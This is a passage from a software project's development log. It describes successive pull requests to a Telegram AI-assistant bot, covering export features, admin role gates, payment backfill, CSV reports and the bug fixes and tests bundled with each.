    `_is_finite_number` predicate so the cost / calls checks stay
    in lock-step. 17 new tests in `tests/test_user_stats.py`
    covering: the bundled fix (corrupt cost / NaN / Inf / bool
    rejection, plus a regression-pin showing the row is dropped
    rather than rendered as $0); the slash command (fresh
    message bubble, default 30d window, accept 7/90/365 args,
    coerce garbage to 30d, skip when from_user is None,
    `@bot` suffix parses identically); the keyboard (4 window
    buttons + back-to-wallet + home, ✓ on the selected window,
    no-✓ on the others, unknown window value falls back to 30d);
    the window-select callback (re-renders with new window,
    silently recovers from garbage payload, swallows
    `message is not modified`, clears FSM); and `_coerce_stats_window`
    (round-trips recognised choices, coerces everything else to
    30). Existing test
    `test_formatter_handles_corrupt_aggregate_values` updated to
    pin the new contract (the lifetime/window aggregates still
    coerce to $0 — there's no row to drop — but the top-models
    row with corrupt cost is now dropped). Total suite: 1961
    passing (was 1944 + 17 new).
14. **Stage-15-Step-E #1 follow-up #1 MERGED** (PR-after-#139) —
    `/history` slash-command alias + chat-token rate-limit
    gate + `_build_history_export_document(user_id, username)`
    helper shared between `memory_export_handler` (wallet-menu
    callback) and `cmd_history` so the two surfaces can never
    drift on filename / encoding / trim semantics. Slash path
    consumes from the existing `consume_chat_token` bucket
    before touching the DB — a user who's already exhausted
    their AI-prompt budget can't pivot to spamming an unbounded
    `Database.get_full_conversation` table scan. Empty-buffer
    case lands as a fresh `message.answer` chat bubble (the
    callback toast pattern needs a callback query to attach
    to). Same defensive `from_user is None` / FSM-clear shape
    as `cmd_start` / `cmd_redeem` / `cmd_stats`. Bundled real
    bug fix: `conversation_export.format_history_as_text`'s
    trim loop was O(n²) on the kept-rows count — pre-fix, a
    user with a 5 MB buffer triggering trim would burn ~50 MB
    of repeated UTF-8 encoding work for the ~4 MB they had to
    drop, every time they hit "Export". Post-fix the loop
    pre-computes each message's encoded byte size once and
    runs a single forward pass: O(n) bytes processed. New
    tests cover the slash-command happy path, empty buffer
    flash, rate-limit short-circuit (must not touch the DB),
    `from_user=None` defensive return, FSM clear, trim
    caption-count regression-pin, `/history@bot` group-chat
    suffix, plus the perf-fix behaviour-pin (drops only oldest,
    most recent always survives, single-second timing budget
    catches an O(n²) regression). Total suite: 1970 tests
    passing (1961 from `main` after #139 + 9 new).
15. **Stage-15-Step-E #5 follow-up #2 MERGED** (PR-after-#140) —
    `/admin/roles` web page mirroring the Telegram `/admin_role_*`
    triplet. New routes: `GET /admin/roles` lists every DB-tracked
    grant with telegram id, role badge, granted-at, granted-by, and
    notes columns plus a per-row revoke button; `POST /admin/roles`
    writes a grant via the existing `Database.set_admin_role`;
    `POST /admin/roles/{telegram_id}/revoke` drops the row via
    `Database.delete_admin_role`. Same auth as the rest of the
    admin panel (the existing `ADMIN_PASSWORD`-gated cookie — per-
    admin web identity is a separate, larger redesign called out
    in the §"what remains" backlog). Both write paths CSRF-
    protected with `verify_csrf_token` and audit-logged via
    `_record_audit_safe` using the existing `role_grant` /
    `role_revoke` slugs (already in `AUDIT_ACTION_LABELS`, so the
    new entries auto-surface in the `/admin/audit` filter
    dropdown). Form validation rejects empty / non-positive
    telegram ids, invalid role names (via
    `admin_roles.normalize_role`), and notes longer than 500
    chars — failures surface a flash banner so the admin sees the
    offending value rather than a generic "DB write failed".
    Sidebar link added to `templates/admin/_layout.html`. Bundled
    real bug fix: `Database.set_admin_role` now strips U+0000 NUL
    bytes from the `notes` argument before INSERT, mirroring the
    Stage-15-Step-E #10 fix on `append_conversation_message` (PR
    #128). Postgres TEXT rejects `\x00` outright with `invalid
    byte sequence for encoding "UTF8": 0x00`; the new web textarea
    is the surface most likely to hit this (an admin pasting from
    a binary file), but `/admin_role_grant`'s Telegram path also
    benefits — a NUL-bearing note used to demote the whole grant
    to a misleading "DB write failed — see logs" error. Strip-
    and-warn at the DB layer keeps the rest of the note text and
    logs the strip count loud-and-once for ops triage. New tests:
    21 in `tests/test_web_admin.py` (auth gate / empty state / row
    rendering / DB error / sidebar nav / happy-path grant +
    revoke / CSRF protection on both write paths / every
    validation branch / DB-error surfacing / noop-revoke audit
    pin) + 3 in `tests/test_database_queries.py` (NUL strip + log
    warn / non-NUL passthrough / `notes=None` early-out). Total
    suite: 1994 tests passing (1970 + 24 new).
16. **Stage-15-Step-E #5 follow-up #3 MERGED** (PR-after-#145) —
    first-login auto-promote of `ADMIN_USER_IDS` env-list admins to
    a real `admin_roles` row. New helper
    `admin_roles.ensure_env_admins_have_roles(db, admin_ids)` is
    called from `main.main()` after `db.init` and the disabled-
    toggle warmup. For each id in
    `parse_admin_user_ids(os.getenv("ADMIN_USER_IDS"))`, the helper
    checks `db.get_admin_role(id)` and, when absent, UPSERTs a
    `super` row with `granted_by=None` and a "auto-promoted from
    ADMIN_USER_IDS at boot" notes marker. Defensive contract:
    never **downgrade** (an existing DB role for an env-list user
    is preserved — the env list is the floor, not the ceiling),
    never **escalate non-env users**, never **block boot** (DB
    errors are logged and bypassed; the env-list fallback in
    `effective_role` keeps working), and never **auto-promote
    non-positive ids** (Telegram never issues 0 / negative user
    ids). Returns a counter dict
    `{promoted, skipped_existing, skipped_invalid, errors}` so the
    boot log surfaces "we promoted N admins this boot" without
    re-querying. Idempotent — a second boot finds the rows from
    the first and bumps `skipped_existing`. Bundled real bug fix:
    `parse_admin_user_ids` now drops non-positive integer entries
    with a logged WARN. Pre-fix, a typo (`ADMIN_USER_IDS=123,-456`)
    or accidental chat-id paste would silently put a never-
    matchable row in the admin set; with the new auto-promote
    layered on top, the same typo would also seed a bogus
    `admin_roles` row in the DB. Drop them at parse time so every
    downstream consumer (`is_admin`, `_resolve_actor_role`, the
    new auto-promote) sees a clean set. New tests: 11 in
    `tests/test_admin_roles.py` (promote-missing happy / never
    downgrade / idempotent / skip non-positive / skip non-int /
    get-failure isolation / set-failure isolation / dedupes
    input / empty-input no-op / custom notes pass-through) plus
    the `parse_admin_user_ids` non-positive regression pin.
    Total suite: 2117 tests passing (2106 + 11 new).
17. **Stage-15-Step-E #6 follow-ups #2 + #3 MERGED** (PR-after-#146)
    — optional GH Actions integration workflow + manual smoke
    recipe doc. New `.github/workflows/integration.yml` runs the
    Telethon-based integration suite on a manual
    `workflow_dispatch` trigger ONLY (never push / pull_request /
    schedule / release — every run sends real Telegram messages
    and debits the test wallet). Operator stores the four secrets
    in repo Settings → Secrets and variables → Actions, then
    Actions tab → "Integration tests (live Telegram)" → "Run
    workflow". Job-level 15-minute timeout, concurrency group with
    cancel-in-progress so manual re-triggers don't pile up,
    pre-step prints which secrets are present (without values) so
    a missing binding surfaces in the run log instead of silently
    skipping. README's "Telethon-driven live-bot integration test
    suite" bullet now documents the manual smoke recipe as the
    no-CI-setup path: export the four env vars locally and run
    `pytest tests/integration/ -v`. **9 stdlib-only sanity tests**
    in `tests/test_workflows.py` pin the workflow's shape (file
    exists, has a `name`, is `workflow_dispatch`-only, has a 1-60
    min `timeout-minutes`, binds all four `TG_*` secrets via
    `${{ secrets.X }}`, declares a concurrency group with
    `cancel-in-progress: true`, pins Python 3.11/3.12, installs
    `requirements-dev.txt`, and `ci.yml` still exists). Stdlib-only
    because the project has zero runtime YAML dependency — adding
    PyYAML just to lint a CI file would bloat the production
    image. Bundled real bug fix:
    `vision.build_multimodal_user_message` now type-checks the
    `prompt` argument against `str | None` before
    `(prompt or "").strip()`. Pre-fix, a non-string truthy
    `prompt` (dict / list / int / etc.) would slip past the
    `or ""` short-circuit and crash with `AttributeError:
    'dict' object has no attribute 'strip'` instead of the
    documented `VisionError(reason="invalid_input")` contract.
    The function's docstring promises every bad input shape
    produces a clean VisionError; the fix closes the gap. 7 new
    tests in `tests/test_vision.py` cover the type-guard
    rejection (parametrized over dict / list / int / float /
    bytes / `object()`) plus a regression pin that
    `prompt=None` with a non-empty image list still works (the
    documented "image-only" calling convention).
18. **Stage-15-Step-E #7 follow-up #2 MERGED** (PR-after-#147) —
    importer side of the .po round-trip. New
    `python -m i18n_po import <lang> <path>` CLI bulk-loads a
    translator's .po into the runtime `bot_strings` override
    table. Every msgstr is validated through
    `strings.validate_override` before being written; entries
    that fail (unknown slug, bad placeholder, malformed format
    syntax) are reported and skipped — the rest are upserted.
    `--dry-run` validates without writing. `--updated-by NAME`
    tags `bot_strings.updated_by` with a translator name or PR
    number for traceability. Five-bucket summary
    (`upserted` / `unchanged` / `skipped_empty` /
    `skipped_unknown_slug` / `invalid` / `errors`); exits
    non-zero if any entry hit `invalid` or `errors` so
    CI / cron-driven imports can fail fast. Closes the .po
    round-trip: a community translator submits messages.po, the
    operator runs the import, and overrides go live without a
    code deploy. Implementation also exposes
    `import_po_into_db(db, lang, po_text, *, dry_run,
    updated_by, existing_overrides)` and `ImportReport` for
    callers (future admin web UI) that want to drive the
    importer programmatically without argparse. Bundled real
    bug fix: `Database.upsert_string_override` now strips NUL
    bytes from both `value` and `updated_by` before insertion
    (Postgres TEXT rejects NUL with `invalid byte sequence for
    encoding "UTF8": 0x00`). Pre-fix, a translator's .po
    containing a stray NUL (some Crowdin export pipelines emit
    them inside multi-line msgstrs) would crash the upsert
    mid-batch and bubble up to the importer; the web admin
    editor had the same 500 crash mode. Defensive strip pattern
    is consistent with the prior `set_admin_role` NUL-byte
    handling for the `notes` column. 21 new tests in
    `tests/test_i18n_po_import.py` covering happy path /
    dry-run / every skip-bucket / pre-loaded existing-overrides
    optimisation / `updated_by` plumbing / unknown lang
    rejection / invalid-placeholder bucketing without abort /
    unparseable .po surfaced as single error / per-key DB
    upsert error reported without abort / DB snapshot error
    aborts cleanly / report rendering / has_failures semantics
    / `total_seen` arithmetic / CLI argparse coverage / NUL
    byte strip in value / NUL byte strip in updated_by / clean
    input passthrough. Suite: 2106 → 2127 passing (+21 new).
19. **Stage-15-Step-E #2 follow-up #3 MERGED** (PR-after-#148) —
    per-day spending breakdown ASCII bars on the user-facing
    `/stats` screen. New `Database.get_user_daily_spending(
    telegram_id, days)` groups `usage_logs` by
    `date_trunc('day', created_at)::date` over the requested
    rolling window, returning ``[{"date": "YYYY-MM-DD",
    "calls": int, "cost_usd": float}, ...]`` oldest-first.
    Renderer (`user_stats._format_daily_bars`) emits one row per
    day inside a Markdown fenced code block with a fixed-width
    bar (`█` filled / `░` empty, 16 chars wide), proportional
    to ``cost / max(cost)`` over the visible window. Missing-
    usage days are padded as zero-height bars so the date axis
    stays continuous from oldest → newest. Image-based graphs
    are still out of scope — the chart is rendered as
    monospaced text inside Telegram's existing message envelope,
    no new dependency surface needed. Wired into
    `_build_stats_render` (which now also serves
    `cmd_stats` + `stats_window_select_handler`) with a
    best-effort `try/except` around the new query so a
    transient DB error doesn't crash the whole stats screen —
    the user still sees lifetime + window totals + top models
    without the chart. Bundled real bug fix:
    `Database.get_user_spending_summary` did not scrub `NaN` /
    `Inf` values out of the `cost_usd` column. The pattern
    `float(row["cost"] or 0)` would NOT substitute `0` for
    `Decimal('NaN')` because `Decimal('NaN')` is *truthy* in
    Python — `Decimal('NaN') or 0` returns the `Decimal('NaN')`,
    then `float(...)` produces `nan`. The user-facing renderer's
    `_safe_float` already clamped at render time but the
    snapshot dict leaked NaN to other potential callers (admin
    tooling, future Prometheus tiles, tests). Worse, the
    parallel `int(row["tokens"] or 0)` path *crashed* with
    `ValueError` if a future schema change to numeric tokens let
    a NaN through. The new `_finite_int` / `_finite_float`
    helpers in `get_user_spending_summary` and
    `get_user_daily_spending` scrub at the DB boundary so the
    snapshot dict contains finite floats only. 17 new tests in
    `tests/test_user_stats.py` covering: SQL shape (user-scope
    filter, interval bounds, GROUP BY 1, ORDER BY 1) /
    ISO-date + finite-float coercion / NaN+Inf cost scrub /
    NULL day skip / days clamp ([1, USER_STATS_WINDOW_DAYS_MAX])
    / non-positive telegram-id refusal / NaN top_models cost
    scrub / NaN tokens scrub / formatter empty-state / formatter
    populated-state code-block + bar widths / missing-day
    padding / zero-height bar for zero-cost day / invalid-date
    row drop / NaN cost row drop / Persian locale rendering /
    window-truncation for stale snapshots / `_empty_stats_snapshot`
    includes `daily` key. Suite: 2106 → 2123 passing (+17 new).
20. **Stage-15-Step-E #9 follow-up #2 MERGED** (PR-after-#148) —
    monetization CSV export at `GET
    /admin/monetization/export.csv?window=7|30|90`. Streams a single
    CSV with a `scope` column (`lifetime` / `window` /
    `window_by_model`) so an operator can pivot it for monthly P&L
    without screen-scraping. Honours the same `?window=` allowlist
    as the HTML page; pulls `MONETIZATION_CSV_TOP_MODELS_LIMIT=1000`
    rows (vs. the on-screen `_MONETIZATION_TOP_MODELS_LIMIT=10`)
    so the long-tail models are included for offline analysis.
    `Cache-Control: no-store` + timestamped filename
    (`monetization-{N}d-YYYYMMDDTHHMMSSZ.csv`) follow the same
    pattern as `transactions_csv_get`. Each successful export
    writes a `monetization_export_csv` audit row with the window
    + row count + db_error flag in `meta`. The HTML page grew an
    "⬇ Export CSV" link in the header carrying the active
    `?window=` into the export. **Bundled real bug fix:**
    `transactions_export_csv` was being recorded by
    `record_admin_audit` since Stage-9-Step-7 but was missed when
    the audit-dropdown sweep landed in Stage-15-Step-F follow-up
    #3 — operators filtering "CSV exports only" on the audit page
    couldn't pick the slug out of the dropdown and had to scroll
    the full unfiltered feed. Fix: added BOTH
    `transactions_export_csv` AND `monetization_export_csv` to
    `AUDIT_ACTION_LABELS`, with a regression test that pins both
    labels so a future PR can't drop them again — same shape as
    the existing `role_grant` / `role_revoke` pin from
    Stage-15-Step-E #5 follow-up #1. New helpers:
    `_format_usd_csv` (4dp, no comma, scrubs NaN/Inf to
    `"0.0000"` mirroring `Database._finite_float`),
    `_format_monetization_csv_rows` (pure-function serializer,
    drops non-dict by_model entries, parametrised over the
    summary shape so a future schema bump surfaces here as a
    `KeyError` rather than silent data loss),
    `monetization_csv_get` (the route handler with fail-soft
    DB-error path that still emits an empty-zero CSV with the
    markup populated). 14 new tests in `tests/test_web_admin.py`
    covering: header pin / populated-summary row shape /
    empty-by_model / non-dict by_model entry skip / NaN+Inf
    scrub for `_format_usd_csv` / auth required / route
    end-to-end (CSV body + headers + filename + cache-control)
    / `?window=` allowlist threading / invalid-window fall-back
    (parametrised over 6 bad inputs) / `top_models_limit=1000`
    pin / DB-error fail-soft renders empty CSV with markup /
    audit row written / HTML page exposes the export link /
    audit-action labels include both export slugs. Suite:
    2106 → 2120 passing (+14 new).
21. **Stage-15-Step-E #8 follow-up #2 MERGED** (PR-after-#148) —
    Zarinpal browser-close backfill reaper. Closes the gap where
    Zarinpal settles an order whose user closes the browser
    before the `?Authority=…&Status=OK` redirect lands. New
    `zarinpal_backfill.py` module spawns a periodic asyncio task
    at boot (interval `ZARINPAL_BACKFILL_INTERVAL_MIN`, default
    5 min) that for each PENDING Zarinpal row in the
    `(min_age, max_age)` window calls
    `zarinpal.verify_payment` → `Database.finalize_payment` →
    sends the standard credit DM → writes an audit row marked
    `actor="zarinpal_backfill"`. New DB query
    `Database.list_pending_zarinpal_for_backfill(
    min_age_seconds, max_age_hours, limit)` filters by
    `gateway='zarinpal' AND status='PENDING'` with both age
    bounds and coerces legacy NULL / non-finite / non-positive
    `amount_crypto_or_rial` rows out of the result. Heartbeat
    via `record_loop_tick("zarinpal_backfill")` exposed as
    `meowassist_zarinpal_backfill_last_run_epoch`. Per-process
    counters (`rows_examined` / `credited` / `verify_failed` /
    `transport_error` / `finalize_noop` / `audit_failed`)
    available via `get_zarinpal_backfill_counters()` for future
    ops panel integration. Jurisdictional split with the existing
    `pending_expiration` reaper enforced by env-var convention:
    backfill owns up to 23h, expire owns 24h+, with a 1-hour
    buffer documented in the README. Wired into
    `main.start_webhook_server` directly after
    `start_pending_expiration_task`, cancelled cleanly on
    shutdown. TetraPay and NowPayments don't need this because
    their callbacks are server-to-server POSTs that retry on
    5xx — only Zarinpal's user-redirect model has the
    browser-close gap. Bundled real bug fix:
    `metrics.record_loop_tick(name)` now logs a WARN exactly
    once per process when *name* is not in
    `_LOOP_METRIC_NAMES`. Pre-fix, a typo'd loop name would
    silently store the tick but the gauge would never appear in
    the `/metrics` exposition — Prometheus' "loop is stuck"
    alert (`time() - last_run_epoch > N`) would then perpetually
    fire on the (forever-zero) gauge, masquerading as a real
    outage. The new warning surfaces the typo at the loop's
    first tick. The dedupe set is also cleared by
    `reset_loop_ticks_for_tests` so each test starts fresh. 19
    new tests in `tests/test_zarinpal_backfill.py` covering: SQL
    shape (gateway+status filters, both age bounds, ordering,
    return-shape coercion) / invalid-bounds rejection / NULL +
    zero + negative IRR row filtering / happy path
    (verify→finalize→DM→audit) / verify-rejected (no finalize,
    no DM) / transport-error (no finalize) / finalize-noop
    (callback raced ahead) / per-row crash isolation / empty
    result / DB query error / DM failure (TelegramForbiddenError)
    doesn't block credit / `_read_int_env` unset+garbage+
    below-minimum / `record_loop_tick` warn-once / no-warn for
    known names / one warn per distinct unknown name /
    `zarinpal_backfill` is in `_LOOP_METRIC_NAMES` / reset
    clears warned set. Suite: 2106 → 2125 passing (+19 new).
22. **Stage-15-Step-E #10 follow-up #1 MERGED** (PR #153) —
    image-as-document rejection handler. iPhone's default photo
    format (HEIC) and Telegram's "Send as File" attach mode both
    arrive as `message.document` (not `message.photo`), so
    `process_photo` never sees them and the bot silently ignores
    the upload. New `@router.message(F.document)` handler
    `process_image_document` filters to `mime_type` starting with
    `image/` (HEIC / HEIF / PNG / WEBP / TIFF / SVG / AVIF / BMP /
    x-icon — the exhaustive `image/*` family) and replies with a
    new localised slug `ai_image_document_instruction` telling
    the user to re-attach as Photo, not File. Non-image documents
    (PDFs, archives, audio) pass through silently — explicit
    "I do not handle this" signal so a future PDF / audio handler
    can be added without colliding. Per-user chat-token bucket
    gates the reply (so a malicious client spamming HEIC uploads
    can't burn our outbound Telegram-API budget); when the bucket
    is exhausted we drop silently rather than send a "rate-limited"
    reply on top of the chat's already-throttled state. The mime
    filter fires BEFORE the rate-limit gate so a user sending a
    PDF (which we pass through) doesn't have their chat-token
    budget penalised. `from_user is None` (anonymous-admin /
    channel forward) drops silently mirroring `process_photo`.
    HEIC isn't auto-converted server-side because the conversion
    needs Pillow + `pillow-heif` (a CPU-bound, memory-heavy
    operation on a hot path), and Telegram's "Photo" attach mode
    already converts client-side to JPEG for free; telling the
    user to flip the attach mode is a one-tap fix, spending
    operator-side memory + CPU re-encoding every iPhone photo
    isn't. Bundled real bug fix:
    `handlers._download_photo_to_bytes` now catches `Exception`
    instead of `TelegramAPIError` only on both the `get_file` and
    `download_file` branches. Pre-fix the docstring promised
    "loud-but-recoverable" — return None on any failure so
    `process_photo` could surface `ai_image_download_failed` —
    but a non-aiogram-wrapped error (`asyncio.TimeoutError` from
    aiogram's request-timeout firing,
    `aiohttp.ClientConnectionError` / `ClientPayloadError` from
    the streaming download, `ConnectionResetError` from a peer
    reset mid-transfer) propagated out of the helper, past the
    photo handler's outer `try/finally`, and the user saw nothing
    — no reply, no error, just silence — while ops triage was
    harder than necessary because the unhandled stack reached the
    poller. Post-fix the broadened catch produces None for every
    transport-layer crash mode and `log.exception` keeps the
    failure visible in ops logs. 30 new test instances in
    `tests/test_process_image_document.py` (parametrised over 13
    image mime types incl. mixed-case + whitespace, parametrised
    over 10 non-image mime types incl. None / empty, FA + EN copy,
    `from_user is None` drop, `document is None` defence,
    rate-limit silent-drop, PDF doesn't drain chat-token,
    caption-on-document is ignored, slug present in both locales)
    + 6 new regression test instances in
    `tests/test_process_photo.py` (parametrised over
    `asyncio.TimeoutError` / `aiohttp.ClientConnectionError` /
    `aiohttp.ClientPayloadError` / `ConnectionResetError` /
    generic `RuntimeError` on both `get_file` and `download_file`
    sites). Suite: 2204 → 2240 passing (+36 new).
23. **Stage-15-Step-E #2 follow-up #4 OPENED** (PR-after-#153) —
    user-facing usage-log CSV export. New
    `Database.export_user_usage_logs(telegram_id, *, limit=None)`
    fetches up to `USAGE_LOGS_EXPORT_MAX_ROWS` (50 000) rows
    from `usage_logs` for the requesting user, oldest-first so a
    CSV opened in Excel reads top-to-bottom in chronological
    order. New pure-function module `usage_csv_export.py`
    (mirrors `conversation_export.py`'s text-export shape from
    Stage-15-Step-E #1) renders to RFC-4180 CSV with a UTF-8 BOM
    (Excel auto-detects UTF-8 only with the BOM, otherwise a
    Persian model display name mojibakes), ``\n`` line
    terminator, six-fractional-digit cost precision (matches the
    `cost_deducted_usd DECIMAL(10,6)` column), front-trims the
    OLDEST rows when over `EXPORT_MAX_BYTES` (5 MB), and returns
    `(csv_bytes, kept_count)` so the caller can surface the
    real count to the user (a heavy user whose buffer was
    trimmed sees "Usage report (30 000 rows)" matching the
    actual file, not "(50 000)" lying about it). New
    `@router.callback_query(F.data == "usage_export")` handler
    mounted on the existing `/stats` keyboard (button text
    "📤 Download usage CSV" / FA "📤 دریافت CSV مصرف" on its
    own row above back+home). New `/usage_csv` slash-command
    alias re-uses the same private builder so the two surfaces
    can never drift on filename / encoding / trim semantics —
    same shape as `/history` from Stage-15-Step-E #1. Slash path
    is rate-limited via `consume_chat_token` (same chat-token
    bucket as AI prompts so a user already exhausted on prompts
    can't pivot to spamming exports); callback path is not
    (Telegram's own callback-debounce is the soft cap, mirroring
    `memory_export_handler`). Empty-buffer case is a toast on
    the callback path (button stays visible so a re-tap after a
    chat works) and a fresh chat bubble on the slash path
    (toast needs a callback query). Filename pattern
    `meowassist-usage-<telegram_id>-<UTC date>.csv` matches the
    conversation-history export's pattern so a user with both
    files saved sees a consistent naming scheme in their
    downloads folder. Bundled real bug fix:
    `Database.list_user_usage_logs` (admin-side
    `GET /admin/users/{id}/usage` view) used bare `int(...)` /
    `float(...)` row-mapper coercions. The parallel
    `get_user_spending_summary` already scrubs but the per-row
    mapper did not — a poisoned `cost_deducted_usd =
    Decimal('NaN')` row (legacy bug pre-PR-#75 wrote NaN into
    that column for a small set of users; PostgreSQL accepts
    `'NaN'::numeric`) would either render `$nan` in the cost
    column or 500 the admin page on `int(Decimal('NaN'))`. New
    module-level `_coerce_usage_log_row` helper scrubs every
    numeric column to a finite, non-negative value at the
    boundary, shared between `list_user_usage_logs` and the
    new `export_user_usage_logs` so the two surfaces cannot
    drift. 56 new test instances:
    `tests/test_usage_csv_export.py` (35 — header order pin,
    one-row-per-input, six-digit cost precision, UTC ISO
    timestamp formatting for str / datetime / naive / non-UTC
    /  None / unparseable inputs, NaN/Inf/None/non-numeric
    /True scrub on cost + tokens, RFC-4180 quoting on
    `,` / `"` / `\n` in model id, UTF-8 BOM, ``\n`` line
    terminator, kept-count semantics + front-trim under tiny
    budget, EXPORT_MAX_BYTES pin, header-only-when-empty,
    user_handle ignored, filename pattern), 8 new
    `tests/test_handlers_usage_csv.py` (callback sends doc,
    callback empty alert, callback caption uses kept count
    after trim, callback filename embeds telegram_id, slash
    sends doc, slash empty chat bubble, slash rate-limit
    short-circuits before DB, slash anonymous user silent
    drop, stats keyboard registers the button), 13 new
    `tests/test_database_queries.py` (NaN scrub on
    `list_user_usage_logs` cost + Inf cost + negative tokens,
    `export_user_usage_logs` filter / limit clamp / floor /
    default-is-max / ValueError on non-positive id +
    non-int id / empty list / row mapping with total_tokens
    sum / NaN cost scrub at boundary). Suite: 2240 → 2296
    passing (+56 new).
24. **Stage-15-Step-E #1 follow-up #2 OPENED** (PR-after-#160) —
    multi-part conversation export pagination. Replaces the
    legacy 1 MB single-file oldest-trim with a paginated export
    that ships up to 10 × 1 MB parts so a heavy user with months
    of memory ON gets the full archive instead of having the
    earliest content silently dropped. New
    `format_history_as_text_multipart(rows, *, user_handle)` in
    `conversation_export.py` returns a list of `(text,
    kept_count_in_part)` pairs, packing whole messages into
    parts of up to `EXPORT_PART_MAX_BYTES` (1 MB) each (greedy,
    oldest-first, never splits a single message across two
    parts) and capping the total at `EXPORT_MAX_PARTS` (10) ×
    `EXPORT_TOTAL_MAX_BYTES` (10 MB). Single-part exports return
    a one-element list with byte-for-byte identical output to
    the legacy `format_history_as_text` (no `Part:` line, legacy
    filename pattern) — the common small-buffer case is
    unchanged for the user. Multi-part exports include a
    `Part: N/M` header line and use a `-part-NN-of-M.txt`
    filename suffix (zero-padded so file managers sort
    lexicographically in the right order). When the buffer
    exceeds the total budget, oldest messages are trimmed first
    and the trim header (`(trimmed K oldest)`) lands on part 1
    only so the user sees the trim note exactly once when
    paging through the files. Step-2b post-pack guard caps
    `len(parts)` to `EXPORT_MAX_PARTS` even if greedy-packing
    leaves slack at the tail of each part (a message that
    barely overflows the running total forces a new part with
    most of the cap unused, which can produce one extra part
    over the cap). The handler (`memory_export_handler` for the
    wallet-menu callback + `cmd_history` for the slash command)
    swap to the new shared `_build_history_export_documents`
    helper that returns a list and sends each part as its own
    `answer_document` call with a per-part caption
    (`memory_export_caption_part` — "Conversation history —
    part N/M (K messages)"); the final callback toast announces
    the cross-part totals via the new `memory_export_done_multipart`
    string. Bundled real bug fix: `_format_one_message`
    previously did `str(row.get("content", ""))` /
    `str(row.get("role", ""))`, which renders the literal
    four-character string `"None"` when the column value is
    `None` (Python's `str(None)` is `"None"`, not `""`). The
    `conversation_messages.content` column is `TEXT NOT NULL`
    so this can't happen on a healthy production row, but it
    DOES surface in (a) test fixtures that pass `content=None`
    to exercise the empty-body case, (b) a future schema
    change adding nullability, (c) a manual SQL fix that
    nullifies a row mid-incident, (d) a custom row shim that
    returns `None` for unknown columns. Same defensive shape on
    the role side. Pre-fix output for an offending row was
    `[ts] None:\nNone\n`; post-fix the row renders with the
    role's existing capitalised-fallback (`Unknown:`) and an
    empty body, so the export stays clean. New helper
    `_coerce_text_field(value)` accepts `str` (passthrough),
    `int` / `float` (legitimate numeric values, coerced via
    `str(...)`), and rejects `bool` (a subclass of `int` —
    `True` / `False` would otherwise render as the ambiguous
    `"1"` / `"0"`) along with `None` / `bytes` / arbitrary
    objects (returns `""` so the caller's existing placeholder
    logic picks up). 16 new tests:
    `tests/test_conversation_export.py` — multipart split
    behaviour (single-part legacy shape pin, oversize-splits-
    into-2+-parts, `Part: N/M` header pin, oldest-first
    packing preserves order, over-total-budget oldest-trim
    with single trim note on part 1, empty-rows still returns
    one-part list, kept-counts sum equals total kept), filename
    helper (single-part matches legacy, multi-part includes
    suffix, zero-pad lex-sorts correctly, ValueError on
    invalid args), bundled bug fix (no literal `"None"` for
    null content, no literal `"None:"` for null role, no
    bytes-repr leak, numeric content renders as string,
    bool-content rejected). Two existing handler-level tests
    rewritten to pin the new pagination contract instead of
    the legacy single-file trim contract. Total suite: 2438 →
    2454 passing (+16 new).
25. **Stage-15-Step-E #5 follow-up #4 OPENED** (PR-after-#161) —
    web admin "view as <role>" toggle. The web panel now mirrors
    the Telegram-side role gates (`/admin_metrics` viewer,
    `/admin_broadcast` operator, `/admin_credit` super, etc.) on
    every browser route via a new `_require_role(required: str)`
    decorator factory that wraps `_require_auth` and reads a
    signed view-as cookie. Per-route floors: viewer-readable
    list/detail/dashboard pages stay on `_require_auth`;
    `operator` floor on broadcast enqueue/cancel and gift /
    promo create+revoke; `super` floor on user-wallet adjust,
    user-field edit, transaction refund, openrouter-keys
    add/toggle/delete, admin-roles grant/revoke, AI-model +
    gateway toggles, and every destructive `/admin/control/*`
    action. Below-floor requests 302 to `/admin/` with a flash
    banner ("That action requires super role — you are
    previewing as viewer …") and a `view_as_deny` audit row
    capturing path + method + required + view-as for forensic
    review. The "view as <role>" toggle: new
    `sign_view_as_cookie()` / `verify_view_as_cookie()` HMAC-
    SHA256 helpers with domain separation (HMAC prefix
    `viewas:`) so a forged auth-cookie HMAC can't replay as a
    view-as override and vice-versa; `verify_view_as_cookie`
    mirrors `verify_cookie`'s fail-soft posture (malformed /
    tampered / unknown role → `None` → falls back to `super`
    rather than crashing post-secret-rotation). New
    `POST /admin/view-as` endpoint (CSRF-protected, audit-
    logged, allow-listed `next=/admin/...` to prevent open-
    redirect abuse) sets the cookie via `set_cookie`
    (path=/admin/, HttpOnly, Lax, max-age = TTL hours);
    selecting `super` deletes the cookie outright so a
    session-secret rotation never leaves a stale signed value
    behind. The toggle widget renders on every page via a new
    `_template_globals` async context processor (registered
    after `admin_auth_middleware` so it can read the
    middleware-stamped `request[REQUEST_KEY_VIEW_AS]` —
    middleware-ordering pin in a comment). New audit slugs
    `view_as_change` / `view_as_deny` added to
    `AUDIT_ACTION_LABELS`. Bundled real bug fix: `sign_cookie`
    now rejects timezone-naive `expires_at` outright.
    `datetime.astimezone(tz)` on a naive datetime silently
    coerces it via the deploy host's *system local time*,
    producing a cookie expiry that depends on the host's `TZ`
    env — same naive `datetime(2099, 1, 1)` becomes different
    ISO strings on a UTC vs. a UTC-7 box. Production callers
    always pass aware datetimes, but the writer-side guard
    closes the loop with `verify_cookie`'s naive-ISO rejection
    (already in place since Stage-8) so a future regression
    that drops `tzinfo=timezone.utc` at a callsite fails loudly
    instead of silently minting host-dependent cookies. 33 new
    tests in `tests/test_web_admin.py`: round-trip per role,
    malformed/tampered/wrong-secret/unknown-role cookie
    rejection, domain-separation pin (auth-cookie HMAC ≠
    view-as HMAC), open-redirect block, role-gate audit pins,
    layout-renders-widget pin, plus a module-level pin walking
    `setup_admin_routes` source to assert the highest-risk
    routes (user adjust/edit, transaction refund, control
    destructives, openrouter CRUD, roles CRUD) are wrapped in
    `_require_role(ROLE_SUPER)` so a regression that drops a
    gate fails immediately. Total suite: 2454 → 2487 passing
    (+33 new).
26. **Stage-15-Step-E #10b row 8 SHIPPED** — MEMORY_CONTEXT_LIMIT +
    MEMORY_CONTENT_MAX_CHARS editor on new `/admin/memory-config` page.
    New `memory_config.py` module (DB-backed override layer, same
    pattern as `free_trial.py`). `database.py` now calls
    `get_memory_context_limit()` / `get_memory_content_max_chars()`
    instead of hardcoded class attributes. Two editor cards (context-
    limit `[1, 500]`, content-max-chars `[100, 100_000]`), set/clear
    actions, audit rows, source badges, sidebar nav link, boot warm-up
